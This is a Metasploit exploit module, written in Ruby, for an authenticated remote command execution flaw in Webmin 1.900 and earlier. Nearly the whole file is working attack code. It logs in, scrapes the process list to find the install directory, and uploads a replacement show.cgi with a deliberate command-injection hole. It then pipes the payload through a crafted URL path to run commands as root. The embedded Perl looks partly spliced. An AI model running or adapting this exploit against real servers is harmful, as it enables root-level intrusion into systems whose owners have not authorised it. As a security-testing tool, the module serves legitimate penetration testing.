# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;
require &#039;uri&#039;

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Webmin 1.900 - Remote Command Execution&#039;,
      &#039;Description&#039;    => %q{
          This module exploits an arbitrary command execution vulnerability in Webmin
        1.900 and lower versions. Any user authorized to the "Java file manager" 
        and "Upload and Download" fields, to execute arbitrary commands with root privileges.
        In addition, "Running Processes" field must be authorized to discover the directory to be uploaded.
        A vulnerable file can be printed on the original files of the Webmin application.
        The vulberable file we are uploading should be integrated with the application. 
        Therefore, a ".cgi" file with the vulnerability belong to webmin application should be used. 
        The module has been tested successfully with Webmin 1900 over Debian 4.9.18.
      },
      &#039;Author&#039;         => [
        &#039;AkkuS <Özkan Mustafa Akkuş>&#039;, # Vulnerability Discovery, PoC & Msf Module
      ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [&#039;URL&#039;, &#039;https://pentest.com.tr/exploits/Webmin-1900-Remote-Command-Execution.html&#039;]
        ],
      &#039;Privileged&#039;     => true,
      &#039;Payload&#039;        =>
        {
          &#039;DisableNops&#039; => true,
          &#039;Space&#039;       => 512,
          &#039;Compat&#039;      =>
            {
              &#039;PayloadType&#039; => &#039;cmd&#039;,
              &#039;RequiredCmd&#039; => &#039;generic perl ruby python telnet&#039;,
            }
        },
      &#039;Platform&#039;       => &#039;unix&#039;,
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Targets&#039;        => [[ &#039;Webmin <= 1.900&#039;, { }]],
      &#039;DisclosureDate&#039; => &#039;Jan 17 2019&#039;,
      &#039;DefaultTarget&#039;  => 0))

      register_options(
        [
          Opt::RPORT(10000),
          OptBool.new(&#039;SSL&#039;, [true, &#039;Use SSL&#039;, true]),
          OptString.new(&#039;USERNAME&#039;,  [true, &#039;Webmin Username&#039;]),
          OptString.new(&#039;PASSWORD&#039;,  [true, &#039;Webmin Password&#039;])
        ], self.class)
  end

##
# Target and input verification
##

  def check

    peer = "#{rhost}:#{rport}"
   
    vprint_status("Attempting to login...")

    data = "page=%2F&user=#{datastore[&#039;USERNAME&#039;]}&pass=#{datastore[&#039;PASSWORD&#039;]}"

    res = send_request_cgi(
      {
        &#039;method&#039;  => &#039;POST&#039;,
        &#039;uri&#039;     => "/session_login.cgi",
        &#039;cookie&#039;  => "testing=1",
        &#039;data&#039;    => data
      }, 25)

    if res and res.code == 302 and res.get_cookies =~ /sid/
      vprint_good "Login successful"
      session = res.get_cookies.split("sid=")[1].split(";")[0]
    else
      vprint_error "Service found, but login failed"
      return Exploit::CheckCode::Detected
    end

    vprint_status("Attempting to execute...")

    command = "echo #{rand_text_alphanumeric(rand(5) + 5)}"

    res = send_request_cgi(
      {
        &#039;uri&#039;     => "/file/show.cgi/bin/#{rand_text_alphanumeric(5)}|#{command}|",
        &#039;cookie&#039;  => "sid=#{session}"
      }, 25)


    if res and res.code == 200 and res.message =~ /Document follows/
      return Exploit::CheckCode::Vulnerable
    else
      return Exploit::CheckCode::Safe
    end

  end

##
# Exploiting phase
##

  def exploit

    peer = "#{rhost}:#{rport}"

    print_status("Attempting to login...")

    data = "page=%2F&user=#{datastore[&#039;USERNAME&#039;]}&pass=#{datastore[&#039;PASSWORD&#039;]}"

    res = send_request_cgi(
      {
        &#039;method&#039;  => &#039;POST&#039;,
        &#039;uri&#039;     => "/session_login.cgi",
        &#039;cookie&#039;  => "testing=1",
        &#039;data&#039;    => data
      }, 25)

    if res and res.code == 302 and res.get_cookies =~ /sid/
      session = res.get_cookies.scan(/sid\=(\w+)\;*/).flatten[0] || &#039;&#039;
      if session and not session.empty?
        print_good "Login successfully"
      else
        print_error "Authentication failed"
        return
      end
    else
      print_error "Authentication failed"
      return
    end

##
# Directory and SSL verification for referer
##  
    ps = "#{datastore[&#039;SSL&#039;]}"
    if ps == "true"
      ssl = "https://"
    else
      ssl = "http://"
    end

    print_status("Target URL => #{ssl}#{peer}")
    
    res1 = send_request_raw(
      {
        &#039;method&#039; => "POST",
        &#039;uri&#039;     => "/proc/index_tree.cgi?",
        &#039;headers&#039; =>
        {
          &#039;Referer&#039;   => "#{ssl}#{peer}/sysinfo.cgi?xnavigation=1",
        },
        &#039;cookie&#039;  => "redirect=1; testing=1; sid=#{session}"
      })

    if res1 and res1.code == 200 and res1.body =~ /Running Processes/
      print_status "Searching for directory to upload..."
      stpdir = res1.body.scan(/perl.+miniserv.pl/).map{ |s| s.split("perl ").last }.map{ |d| d.split("miniserv").first }.map{ |d| d.split("miniserv").first }
      dir = stpdir[0] + "file"   
      print_good("Directory to upload => #{dir}")
    else
      print_error "No access to processes or no upload directory found."
      return
    end  

##
# Loading phase of the vulnerable file
##
    boundary = Rex::Text.rand_text_alphanumeric(29)

    data2 = "-----------------------------{boundary}\r\n"
    data2 << "Content-Disposition: form-data; name=\"upload0\"; filename=\"show.cgi\"\r\n"
    data2 << "Content-Type: application/octet-stream\r\n\r\n"
    data2 << "#!/usr/local/bin/perl\n# show.cgi\n# Output some file for the browser\n\n"
    data2 << "$trust_unknown_referers = 1;\nrequire &#039;./file-lib.pl&#039;;\n&ReadParse();\nuse POSIX;\n"
    data2 << "$p = $ENV{&#039;PATH_INFO&#039;};\nif ($in{&#039;type&#039;}) {\n\t# Use the supplied content type\n\t"
    data2 << "$type = $in{&#039;type&#039;};\n\t$download = 1;\n\t}\nelsif ($in{&#039;format&#039;} == 1) {\n\t"
    data2 << "elsif ($in{&#039;format&#039;} == 2) {\n\t$type = \"application/x-gzip\";\n\t}\n"
    data2 << "elsif ($in{&#039;format&#039;} == 3) {\n\t$type = \"application/x-tar\";\n\t}\nelse {\n\t"
    data2 << "# Try to guess type from filename\n\t$type = &guess_mime_type($p, undef);\n\t"
    data2 << "if (!$type) {\n\t\t# No idea .. use the &#039;file&#039; command\n\t\t"
    data2 << "$out = &backquote_command(\"file \".\n\t\t\t\t\t  quotemeta(&resolve_links($p)), 1);\n\t\t"
    data2 << "if ($out =~ /text|script/) {\n\t\t\t$type = \"text/plain\";\n\t\t\t}\n\t\telse {\n\t\t\t"
    data2 << "$type = \"application/unknown\";\n\t\t\t}\n\t\t}\n\t}\n\n# Dump the file\n&switch_acl_uid();\n"
    data2 << "&error_exit(&text(&#039;view_eaccess&#039;, &html_escape($p)));\n\t}\n$p = &unmake_chroot($p);\n\n"
    data2 << "if ($in{&#039;format&#039;}) {\n\t# An archive of a directory was requested .. create it\n\t"
    data2 << "$archive || &error_exit($text{&#039;view_earchive&#039;});\n\tif ($in{&#039;format&#039;} == 1) {\n\t\t"
    data2 << "$p =~ s/\\.zip$//;\n\t\t}\n\telsif ($in{&#039;format&#039;} == 2) {\n\t\t$p =~ s/\\.tgz$//;\n\t\t}\n\t"
    data2 << "elsif ($in{&#039;format&#039;} == 3) {\n\t\t$p =~ s/\\.tar$//;\n\t\t}\n\t-d $p || &error_exit($text{&#039;view_edir&#039;}.\" \".&html_escape($p));\n\t"
    data2 << "if ($archive == 2 && $archmax > 0) {\n\t\t# Check if directory is too large to archive\n\t\tlocal $kb = &disk_usage_kb($p);\n\t\t"
    data2 << "if ($kb*1024 > $archmax) {\n\t\t\t&error_exit(&text(&#039;view_earchmax&#039;, $archmax));\n\t\t\t}\n\t\t}\n\n\t"
    data2 << "# Work out the base directory and filename\n\tif ($p =~ /^(.*\\/)([^\\/]+)$/) {\n\t\t$pdir = $1;\n\t\t"
    data2 << "$pfile = $2;\n\t\t}\n\telse {\n\t\t$pdir = \"/\";\n\t\t$pfile = $p;\n\t\t}\n\n\t"
    data2 << "# Work out the command to run\n\tif ($in{&#039;format&#039;} == 1) {\n\t\t"
    data2 << "&has_command(\"zip\") || &error_exit(&text(&#039;view_ecmd&#039;, \"zip\"));\n\t\t"
    data2 << "$cmd = \"zip -r $temp \".quotemeta($pfile);\n\t\t}\n\telsif ($in{&#039;format&#039;} == 2) {\n\t\t"
    data2 << "&has_command(\"tar\") || &error_exit(&text(&#039;view_ecmd&#039;, \"tar\"));\n\t\t"
    data2 << "&has_command(\"gzip\") || &error_exit(&text(&#039;view_ecmd&#039;, \"gzip\"));\n\t\t"
    data2 << "$cmd = \"tar cf - \".quotemeta($pfile).\" | gzip -c >$temp\";\n\t\t}\n\t"
    data2 << "elsif ($in{&#039;format&#039;} == 3) {\n\t\t&has_command(\"tar\") || &error_exit(&text(&#039;view_ecmd&#039;, \"tar\"));\n\t\t"
    data2 << "$cmd = \"tar cf $temp \".quotemeta($pfile);\n\t\t}\n\n\tif ($in{&#039;test&#039;}) {\n\t\t"
    data2 << "# Don&#039;t actually do anything if in test mode\n\t\t&ok_exit();\n\t\t}\n\n\t"
    data2 << "# Run the command, and send back the resulting file\n\tlocal $qpdir = quotemeta($pdir);\n\t"
    data2 << "local $out = `cd $qpdir ; ($cmd) 2>&1 </dev/null`;\n\tif ($?) {\n\t\tunlink($temp);\n\t\t"
    data2 << "&error_exit(&text(&#039;view_ecomp&#039;, &html_escape($out)));\n\t\t}\n\tlocal @st = stat($temp);\n\t"
    data2 << "print \"Content-length: $st[7]\\n\";\n\tprint \"Content-type: $type\\n\\n\";\n\t"
    data2 << "open(FILE, $temp);\n\tunlink($temp);\n\twhile(read(FILE, $buf, 1024)) {\n\t\tprint $buf;\n\t\t}\n\t"
    data2 << "&error_exit(&text(&#039;view_eopen&#039;, $p, $!));\n\t\t}\n\n\tif ($in{&#039;test&#039;}) {\n\t\t"
    data2 << "# Don&#039;t actually do anything if in test mode\n\t\tclose(FILE);\n\t\t"
    data2 << "&ok_exit();\n\t\t}\n\n\t@st = stat($p);\n\tprint \"X-no-links: 1\\n\";\n\t"
    data2 << "print \"Content-length: $st[7]\\n\";\n\tprint \"Content-Disposition: Attachment\\n\" if ($download);\n\t"
    data2 << "print \"Content-type: $type\\n\\n\";\n\tif ($type =~ /^text\\/html/i && !$in{&#039;edit&#039;}) {\n\t\t"
    data2 << "while(read(FILE, $buf, 1024)) {\n\t\t\t$data .= $buf;\n\t\t\t}\n\t\tprint &filter_javascript($data);\n\t\t"
    data2 << "}\n\telse {\n\t\twhile(read(FILE, $buf, 1024)) {\n\t\t\tprint $buf;\n\t\t\t}\n\t\t}\n\tclose(FILE);\n\t}\n\n"
    data2 << "sub error_exit\n{\nprint \"Content-type: text/plain\\n\";\n"
    data2 << "print \"Content-length: \",length($_[0]),\"\\n\\n\";\nprint $_[0];\nexit;\n}\n\n"
    data2 << "sub ok_exit\n{\nprint \"Content-type: text/plain\\n\\n\";\nprint \"\\n\";\nexit;\n}"
    data2 << "\r\n\r\n"
    data2 << "-----------------------------{boundary}\r\n"
    data2 << "Content-Disposition: form-data; name=\"dir\"\r\n\r\n#{dir}\r\n"
    data2 << "-----------------------------{boundary}\r\n"
    data2 << "Content-Disposition: form-data; name=\"user\"\r\n\r\nroot\r\n"
    data2 << "-----------------------------{boundary}\r\n"
    data2 << "Content-Disposition: form-data; name=\"group_def\"\r\n\r\n1\r\n"
    data2 << "-----------------------------{boundary}\r\n"
    data2 << "Content-Disposition: form-data; name=\"group\"\r\n\r\n\r\n"
    data2 << "-----------------------------{boundary}\r\n"
    data2 << "Content-Disposition: form-data; name=\"zip\"\r\n\r\n0\r\n"
    data2 << "-----------------------------{boundary}\r\n"
    data2 << "Content-Disposition: form-data; name=\"email_def\"\r\n\r\n1\r\n"
    data2 << "-----------------------------{boundary}\r\n"
    data2 << "Content-Disposition: form-data; name=\"ok\"\r\n\r\nUpload\r\n"
    data2 << "-----------------------------{boundary}--\r\n"

    res2 = send_request_raw(
      {
        &#039;method&#039; => "POST",
        &#039;uri&#039;     => "/updown/upload.cgi?id=154739243511",
        &#039;data&#039; => data2,
        &#039;headers&#039; =>
        {
          &#039;Content-Type&#039;   => &#039;multipart/form-data; boundary=---------------------------{boundary}&#039;,
          &#039;Referer&#039; => "#{ssl}#{peer}/updown/?xnavigation=1",
        },
        &#039;cookie&#039;  => "redirect=1; testing=1; sid=#{session}"
      })

    if res2 and res2.code == 200 and res2.body =~ /Saving file/
      print_good "Vulnerable show.cgi file was successfully uploaded."
    else
      print_error "Upload failed."
      return
    end 
##
# Command execution and shell retrieval
##
    print_status("Attempting to execute the payload...")

    command = payload.encoded

    res = send_request_cgi(
      {
        &#039;uri&#039;     => "/file/show.cgi/bin/#{rand_text_alphanumeric(rand(5) + 5)}|#{command}|",
        &#039;cookie&#039;  => "sid=#{session}"
      }, 25)


    if res and res.code == 200 and res.message =~ /Document follows/
      print_good "Payload executed successfully"
    else
      print_error "Error executing the payload"
      return
    end

  end

end

